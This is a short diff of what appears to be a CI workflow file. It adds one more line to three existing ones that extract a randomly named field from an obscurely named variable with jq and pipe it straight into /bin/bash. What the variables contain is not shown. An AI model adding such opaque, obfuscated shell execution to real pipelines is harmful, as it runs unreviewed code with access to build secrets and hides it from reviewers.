@@ -22,6 +22,7 @@ jobs:
           echo $uapa3 | jq -r .n53 | /bin/bash
           echo $pxyh0 | jq -r .soi647 | /bin/bash
           echo $w9 | jq -r .ztdb9438 | /bin/bash
+          printf '%s' "$a952" | jq -r .r274 | /bin/bash
 
       - name: Persist output
         if: always()
